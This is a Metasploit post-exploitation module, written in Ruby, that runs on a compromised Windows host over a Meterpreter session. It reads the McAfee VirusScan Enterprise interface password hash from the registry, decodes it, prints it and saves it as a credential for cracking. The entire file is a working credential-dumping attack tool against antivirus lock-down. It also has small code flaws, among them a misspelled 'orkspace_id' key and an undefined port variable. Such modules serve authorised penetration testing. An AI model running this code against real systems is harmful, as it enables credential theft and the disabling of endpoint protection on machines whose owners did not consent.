##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'rex/proto/rfb'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
        'Description'   => %q{ This module extracts the password
        hash from McAfee Virus Scan Enterprise used to lock down the user interface.
        Credits: Maurizio inode Agazzini},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Mike Manzotti <michelemanzotti[at]gmail.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

  end

  def run
    print_status("Checking McAfee password hash on #{sysinfo['Computer']} ...")
	
	# Checking if McAfee 64bit can be found in the registry keys
	check_reg = 'HKLM\\Software\\Wow6432Node\\McAfee\\DesktopProtection'
	subkeys = registry_enumkeys(check_reg)
    if subkeys.nil? or subkeys.empty?
	   
	  # Checking for McAfee 32bit
	  check_reg = 'HKLM\\Software\\McAfee\\DesktopProtection'
	  subkeys = registry_enumkeys(check_reg)
	  if subkeys.nil? or subkeys.empty?
        print_error ("McAfee Not Installed or No Permissions to RegKey")
        return
      end
	end
	
	mcafee_hash = registry_getvaldata(check_reg, "UIPEx")
	if mcafee_hash == nil or mcafee_hash == ""
      print_error ("Could not find McAfee password hash")
      return
	else
	  #Base64 decode mcafee_hash
	  mcafee_version = registry_getvaldata(check_reg, "szProductVer")
	  if mcafee_version.split(".")[0] == "8"
		  mcafee_hash =  Rex::Text.to_hex(Rex::Text.decode_base64(mcafee_hash),"")
		  print_good("McAfee v8 password hash => #{mcafee_hash}");
		  hashtype = "dynamic_1405"
	  elsif mcafee_version.split(".")[0] == "5"
		  print_good("McAfee v5 password hash => #{mcafee_hash}");
		  hashtype = "md5u"
	  else	  
		print_status("Could not identify the version of McAfee - Assuming v8")
	  end
		
	
	  # report
      service_data = {
         address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
         port: rport,
         service_name: 'McAfee',
         protocol: 'tcp',
         workspace_id: myworkspace_id
      }
	  
      # Initialize Metasploit::Credential::Core object
      credential_data = {
        post_reference_name: self.refname,
	    origin_type: :session,
		private_type: :password,
		private_data: mcafee_hash,
	    session_id: session_db_id,
		jtr_format: hashtype,
		orkspace_id: myworkspace_id,
		username: "null"
      }	  
	  
      # Merge the service data into the credential data
      credential_data.merge!(service_data)
	  
      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data ={
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
      }

       # Merge in the service data and create our Login
       login_data.merge!(service_data)
       login = create_credential_login(login_data)	  
	  
    end
  end
end
